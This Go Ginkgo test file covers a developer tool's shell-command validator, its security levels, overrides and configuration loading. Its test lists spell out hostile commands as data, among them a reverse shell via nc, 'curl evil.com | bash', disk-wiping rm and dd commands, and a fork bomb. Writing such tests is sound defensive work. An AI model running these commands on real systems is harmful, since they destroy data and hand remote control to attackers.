package security

import (
	"os"
	"path/filepath"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
)

var _ = Describe("CommandValidator", func() {
	Context("DangerousPatterns", func() {
		var moderateValidator *CommandValidator
		var permissiveValidator *CommandValidator

		BeforeEach(func() {
			moderateValidator = NewCommandValidator(SecurityLevelModerate)
			permissiveValidator = NewCommandValidator(SecurityLevelPermissive)
		})

		Context("when using moderate security level", func() {
			It("should block dangerous commands", func() {
				dangerousCommands := []string{
					"rm -rf /",
					"rm -rf /home",
					"dd if=/dev/zero of=/dev/sda",
					":(){ :|:& };:",
				}

				for _, cmd := range dangerousCommands {
					err := moderateValidator.ValidateCommand(cmd)
					Expect(err).To(HaveOccurred(), "Expected dangerous command '%s' to be blocked", cmd)
				}
			})
		})

		Context("when using permissive security level", func() {
			It("should allow commands that would be restricted in other modes", func() {
				allowedCommands := []string{
					"echo malicious > /etc/passwd",     // Allowed in permissive mode
					"nc -e /bin/bash 192.168.1.1 4444", // Allowed in permissive mode
					"curl evil.com | bash",             // Allowed in permissive mode
					"wget -qO- hack.sh | sh",           // Allowed in permissive mode
				}

				for _, cmd := range allowedCommands {
					err := permissiveValidator.ValidateCommand(cmd)
					Expect(err).ToNot(HaveOccurred(), "Expected command '%s' to be allowed under permissive approach", cmd)
				}
			})
		})
	})

	Context("SafePatterns", func() {
		var validator *CommandValidator

		BeforeEach(func() {
			validator = NewCommandValidator(SecurityLevelModerate)
		})

		It("should allow safe commands", func() {
			safeCommands := []string{
				"apt-get update",
				"git --version",
				"docker help",
				"ls -la",
				"echo 'eval \"$(zoxide init bash)\"' >> ~/.bashrc", // Issue #155 fix
				"ln -sf $(which fdfind) ~/.local/bin/fd",           // Issue #155 fix
				"sudo updatedb",                                    // Issue #155 fix
				"pip install package",
				"npm --version",
				"which git",
				"whoami",
			}

			for _, cmd := range safeCommands {
				err := validator.ValidateCommand(cmd)
				Expect(err).ToNot(HaveOccurred(), "Expected safe command '%s' to be allowed", cmd)
			}
		})
	})

	Context("SecurityLevels", func() {
		var testCommand string

		BeforeEach(func() {
			testCommand = "custom-tool --install"
		})

		It("should handle strict mode correctly", func() {
			strictValidator := NewCommandValidator(SecurityLevelStrict)
			err := strictValidator.ValidateCommand(testCommand)
			Expect(err).To(HaveOccurred(), "Expected strict mode to block unknown executable")
		})

		It("should handle moderate mode correctly", func() {
			moderateValidator := NewCommandValidator(SecurityLevelModerate)
			err := moderateValidator.ValidateCommand(testCommand)
			Expect(err).ToNot(HaveOccurred(), "Expected moderate mode to allow benign unknown command")
		})

		It("should handle permissive mode correctly", func() {
			permissiveValidator := NewCommandValidator(SecurityLevelPermissive)
			err := permissiveValidator.ValidateCommand(testCommand)
			Expect(err).ToNot(HaveOccurred(), "Expected permissive mode to allow command")
		})
	})

	Context("CustomWhitelist", func() {
		var validator *CommandValidator
		var testCommand string

		BeforeEach(func() {
			validator = NewCommandValidator(SecurityLevelStrict)
			testCommand = "my-custom-installer"
		})

		It("should block unknown commands initially in strict mode", func() {
			err := validator.ValidateCommand(testCommand)
			Expect(err).To(HaveOccurred(), "Expected custom command to be blocked in strict mode before whitelisting")
		})

		It("should allow commands after adding to whitelist", func() {
			// Add to whitelist
			validator.AddToWhitelist("my-custom-installer")

			// Should now be allowed
			err := validator.ValidateCommand(testCommand)
			Expect(err).ToNot(HaveOccurred(), "Expected command to be allowed after whitelisting")
		})
	})

	Context("CustomBlacklist", func() {
		var validator *CommandValidator
		var testCommand string

		BeforeEach(func() {
			validator = NewCommandValidator(SecurityLevelPermissive)
			testCommand = "some-tool"
		})

		It("should allow commands initially in permissive mode", func() {
			err := validator.ValidateCommand(testCommand)
			Expect(err).ToNot(HaveOccurred(), "Expected command to be allowed in permissive mode")
		})

		It("should still allow commands after adding to blacklist (simplified validator)", func() {
			// Add to blacklist - this doesn't affect the simplified validator
			validator.AddToBlacklist("some-tool")

			// Still allowed because simplified validator ignores custom blacklists for now
			err := validator.ValidateCommand(testCommand)
			Expect(err).ToNot(HaveOccurred(), "Expected command to still be allowed under simplified validator")
		})
	})

	Context("Issue155Cases", func() {
		var validator *CommandValidator

		BeforeEach(func() {
			validator = NewCommandValidator(SecurityLevelModerate)
		})

		It("should allow specific issue #155 commands", func() {
			issue155Commands := []string{
				"echo 'eval \"$(zoxide init bash)\"' >> ~/.bashrc",
				"ln -sf $(which fdfind) ~/.local/bin/fd",
				"sudo updatedb",
			}

			for _, cmd := range issue155Commands {
				err := validator.ValidateCommand(cmd)
				Expect(err).ToNot(HaveOccurred(), "Issue #155 command '%s' should be allowed", cmd)
			}
		})
	})

	Context("CommandSubstitution", func() {
		var validator *CommandValidator

		BeforeEach(func() {
			validator = NewCommandValidator(SecurityLevelPermissive)
		})

		It("should allow all command substitution under permissive approach", func() {
			allSubstitution := []string{
				"echo $(date)",
				"export PATH=$(pwd):$PATH",
				"ln -s $(which git) /usr/local/bin/git",
				"cd $(dirname $0)",
				"echo $(rm -rf /tmp/*)",    // Now allowed - focus on functionality
				"sudo $(echo rm -rf /tmp)", // Now allowed - focus on functionality
			}

			for _, cmd := range allSubstitution {
				err := validator.ValidateCommand(cmd)
				Expect(err).ToNot(HaveOccurred(), "Command substitution '%s' should be allowed under permissive approach", cmd)
			}
		})
	})

	Context("ShellBuiltins", func() {
		var validator *CommandValidator

		BeforeEach(func() {
			validator = NewCommandValidator(SecurityLevelModerate)
		})

		It("should allow shell builtins", func() {
			builtins := []string{
				"echo hello",
				"export VAR=value",
				"cd /tmp",
				"pwd",
				"source ~/.bashrc",
				"alias ll='ls -la'",
			}

			for _, cmd := range builtins {
				err := validator.ValidateCommand(cmd)
				Expect(err).ToNot(HaveOccurred(), "Shell builtin '%s' should be allowed", cmd)
			}
		})
	})

	Context("MaliciousKeywords", func() {
		var validator *CommandValidator

		BeforeEach(func() {
			validator = NewCommandValidator(SecurityLevelPermissive)
		})

		It("should allow commands with malicious keywords under permissive approach", func() {
			maliciousCommands := []string{
				"echo $(malicious_command)",
				"echo $(evil_script)",
				"echo $(hack_attempt)",
				"ln -s $(malicious_tool) /usr/bin/tool",
			}

			for _, cmd := range maliciousCommands {
				err := validator.ValidateCommand(cmd)
				Expect(err).ToNot(HaveOccurred(), "Command with malicious keyword '%s' should be allowed under permissive approach", cmd)
			}
		})
	})

	Context("WithOverrides", func() {
		var validator *CommandValidator
		var config *SecurityConfig

		BeforeEach(func() {
			config = &SecurityConfig{
				Level:           SecurityLevelStrict,
				EnterpriseMode:  false,
				WarnOnOverrides: false, // Disable warnings for testing
				GlobalOverrides: []SecurityOverride{
					{
						RuleType: RuleTypeCommandInjection,
						Pattern:  "curl.*github\\.com.*\\| bash",
						Reason:   "Allow GitHub installation scripts",
						WarnUser: false,
					},
				},
				AppSpecificOverrides: map[string][]SecurityOverride{
					"docker": {
						{
							RuleType: RuleTypePrivilegeEscalation,
							Pattern:  "sudo docker.*",
							Reason:   "Docker requires sudo",
							WarnUser: false,
						},
					},
				},
			}
			validator = NewCommandValidatorWithConfig(SecurityLevelStrict, config)
		})

		It("should allow commands with global override", func() {
			err := validator.ValidateCommand("curl -fsSL https://github.com/user/repo/install.sh | bash")
			Expect(err).ToNot(HaveOccurred(), "Global override should allow GitHub installation script")
		})

		It("should allow commands with app-specific override", func() {
			err := validator.ValidateCommandForApp("sudo docker run hello-world", "docker")
			Expect(err).ToNot(HaveOccurred(), "App-specific override should allow sudo docker command")
		})

		It("should still block dangerous commands", func() {
			err := validator.ValidateCommand("rm -rf /")
			Expect(err).To(HaveOccurred(), "Critical dangerous command should still be blocked even with overrides")
		})

		It("should block commands without override", func() {
			err := validator.ValidateCommand("unknown-command")
			Expect(err).To(HaveOccurred(), "Unknown command should be blocked in strict mode without override")
		})
	})

	Context("EnterpriseMode", func() {
		var validator *CommandValidator

		BeforeEach(func() {
			config := &SecurityConfig{
				Level:           SecurityLevelEnterprise,
				EnterpriseMode:  true,
				WarnOnOverrides: false, // Disable warnings for testing
			}
			validator = NewCommandValidatorWithConfig(SecurityLevelEnterprise, config)
		})

		It("should allow most commands in enterprise mode", func() {
			commands := []string{
				"curl -fsSL https://example.com/script.sh | bash",
				"sudo apt-get install something",
				"unknown-executable --do-something",
				"nc -l 1234",
			}

			for _, cmd := range commands {
				err := validator.ValidateCommand(cmd)
				Expect(err).ToNot(HaveOccurred(), "Enterprise mode should allow command '%s'", cmd)
			}
		})

		It("should still block critical dangerous commands", func() {
			criticalCommands := []string{
				"rm -rf /",
				"dd if=/dev/zero of=/dev/sda",
				":(){ :|:& };:",
			}

			for _, cmd := range criticalCommands {
				err := validator.ValidateCommand(cmd)
				Expect(err).To(HaveOccurred(), "Enterprise mode should still block critical dangerous command '%s'", cmd)
			}
		})
	})

	Context("AllSecurityLevels", func() {
		var testCommand string

		BeforeEach(func() {
			testCommand = "custom-installer --setup"
		})

		It("should handle all security levels correctly", func() {
			levels := []struct {
				level    SecurityLevel
				name     string
				expected bool // true if command should be allowed
			}{
				{SecurityLevelStrict, "strict", false},        // Unknown executable should be blocked
				{SecurityLevelModerate, "moderate", true},     // Should be allowed if not dangerous
				{SecurityLevelPermissive, "permissive", true}, // Should be allowed
				{SecurityLevelEnterprise, "enterprise", true}, // Should be allowed
			}

			for _, tt := range levels {
				validator := NewCommandValidator(tt.level)
				err := validator.ValidateCommand(testCommand)

				if tt.expected {
					Expect(err).ToNot(HaveOccurred(), "Security level %s should allow command '%s'", tt.name, testCommand)
				} else {
					Expect(err).To(HaveOccurred(), "Security level %s should block command '%s'", tt.name, testCommand)
				}
			}
		})
	})
})

var _ = Describe("SecurityConfig", func() {
	Context("LoadAndSave", func() {
		var tempDir string
		var configPath string

		BeforeEach(func() {
			var err error
			tempDir, err = os.MkdirTemp("", "devex-security-test")
			Expect(err).ToNot(HaveOccurred())
			configPath = filepath.Join(tempDir, "security.yaml")
		})

		AfterEach(func() {
			os.RemoveAll(tempDir)
		})

		It("should save and load security configuration correctly", func() {
			// Create a test security config
			testConfig := &SecurityConfig{
				Level:           SecurityLevelModerate,
				EnterpriseMode:  false,
				WarnOnOverrides: true,
				GlobalOverrides: []SecurityOverride{
					{
						RuleType: RuleTypeCommandInjection,
						Pattern:  "curl.*github\\.com.*\\| bash",
						Reason:   "Allow GitHub installation scripts",
						WarnUser: true,
					},
				},
				AppSpecificOverrides: map[string][]SecurityOverride{
					"docker": {
						{
							RuleType: RuleTypePrivilegeEscalation,
							Pattern:  "sudo docker.*",
							Reason:   "Docker requires sudo",
							WarnUser: false,
						},
					},
				},
			}

			// Test saving configuration
			err := SaveSecurityConfig(testConfig, configPath)
			Expect(err).ToNot(HaveOccurred())

			// Test loading configuration
			loadedConfig, err := LoadSecurityConfig(configPath)
			Expect(err).ToNot(HaveOccurred())

			// Verify configuration values
			Expect(loadedConfig.Level).To(Equal(SecurityLevelModerate))
			Expect(loadedConfig.EnterpriseMode).To(BeFalse())
			Expect(loadedConfig.GlobalOverrides).To(HaveLen(1))
			Expect(loadedConfig.AppSpecificOverrides["docker"]).To(HaveLen(1))
		})
	})

	Context("ValidationErrors", func() {
		It("should validate security configurations correctly", func() {
			tests := []struct {
				name        string
				config      SecurityConfig
				expectError bool
			}{
				{
					name: "valid_config",
					config: SecurityConfig{
						Level: SecurityLevelModerate,
						GlobalOverrides: []SecurityOverride{
							{
								RuleType: RuleTypeDangerousCommand,
								Pattern:  "test.*",
								Reason:   "Test reason",
								WarnUser: true,
							},
						},
					},
					expectError: false,
				},
				{
					name: "invalid_security_level",
					config: SecurityConfig{
						Level: SecurityLevel(99),
					},
					expectError: true,
				},
				{
					name: "invalid_rule_type",
					config: SecurityConfig{
						Level: SecurityLevelModerate,
						GlobalOverrides: []SecurityOverride{
							{
								RuleType: SecurityRuleType("invalid-rule"),
								Pattern:  "test.*",
								Reason:   "Test reason",
								WarnUser: true,
							},
						},
					},
					expectError: true,
				},
				{
					name: "empty_pattern",
					config: SecurityConfig{
						Level: SecurityLevelModerate,
						GlobalOverrides: []SecurityOverride{
							{
								RuleType: RuleTypeDangerousCommand,
								Pattern:  "",
								Reason:   "Test reason",
								WarnUser: true,
							},
						},
					},
					expectError: true,
				},
				{
					name: "invalid_regex_pattern",
					config: SecurityConfig{
						Level: SecurityLevelModerate,
						GlobalOverrides: []SecurityOverride{
							{
								RuleType: RuleTypeDangerousCommand,
								Pattern:  "[invalid",
								Reason:   "Test reason",
								WarnUser: true,
							},
						},
					},
					expectError: true,
				},
				{
					name: "empty_reason",
					config: SecurityConfig{
						Level: SecurityLevelModerate,
						GlobalOverrides: []SecurityOverride{
							{
								RuleType: RuleTypeDangerousCommand,
								Pattern:  "test.*",
								Reason:   "",
								WarnUser: true,
							},
						},
					},
					expectError: true,
				},
			}

			for _, tt := range tests {
				err := validateSecurityConfig(&tt.config)
				if tt.expectError {
					Expect(err).To(HaveOccurred(), "Expected validation error for %s but got none", tt.name)
				} else {
					Expect(err).ToNot(HaveOccurred(), "Expected no validation error for %s but got: %v", tt.name, err)
				}
			}
		})
	})

	Context("LoadSecurityConfigFromDefaults", func() {
		var tempDir string

		BeforeEach(func() {
			var err error
			tempDir, err = os.MkdirTemp("", "devex-security-defaults-test")
			Expect(err).ToNot(HaveOccurred())
		})

		AfterEach(func() {
			os.RemoveAll(tempDir)
		})

		It("should load default config when no config files exist", func() {
			config, err := LoadSecurityConfigFromDefaults(tempDir)
			Expect(err).ToNot(HaveOccurred())
			Expect(config.Level).To(Equal(SecurityLevelModerate))
		})

		It("should load system config when available", func() {
			// Create system config
			systemConfigDir := filepath.Join(tempDir, ".local/share/devex/config")
			err := os.MkdirAll(systemConfigDir, 0755)
			Expect(err).ToNot(HaveOccurred())

			systemConfig := &SecurityConfig{
				Level:           SecurityLevelStrict,
				WarnOnOverrides: true,
			}

			systemConfigPath := filepath.Join(systemConfigDir, "security.yaml")
			err = SaveSecurityConfig(systemConfig, systemConfigPath)
			Expect(err).ToNot(HaveOccurred())

			// Test loading system config
			config, err := LoadSecurityConfigFromDefaults(tempDir)
			Expect(err).ToNot(HaveOccurred())
			Expect(config.Level).To(Equal(SecurityLevelStrict))
		})

		It("should load user config with override priority", func() {
			// Create system config first
			systemConfigDir := filepath.Join(tempDir, ".local/share/devex/config")
			err := os.MkdirAll(systemConfigDir, 0755)
			Expect(err).ToNot(HaveOccurred())

			systemConfig := &SecurityConfig{
				Level:           SecurityLevelStrict,
				WarnOnOverrides: true,
			}

			systemConfigPath := filepath.Join(systemConfigDir, "security.yaml")
			err = SaveSecurityConfig(systemConfig, systemConfigPath)
			Expect(err).ToNot(HaveOccurred())

			// Create user override config
			userConfigDir := filepath.Join(tempDir, ".devex")
			err = os.MkdirAll(userConfigDir, 0755)
			Expect(err).ToNot(HaveOccurred())

			userConfig := &SecurityConfig{
				Level:           SecurityLevelPermissive,
				WarnOnOverrides: false,
			}

			userConfigPath := filepath.Join(userConfigDir, "security.yaml")
			err = SaveSecurityConfig(userConfig, userConfigPath)
			Expect(err).ToNot(HaveOccurred())

			// Test loading user config (should override system)
			config, err := LoadSecurityConfigFromDefaults(tempDir)
			Expect(err).ToNot(HaveOccurred())
			Expect(config.Level).To(Equal(SecurityLevelPermissive))
			Expect(config.WarnOnOverrides).To(BeFalse())
		})
	})
})
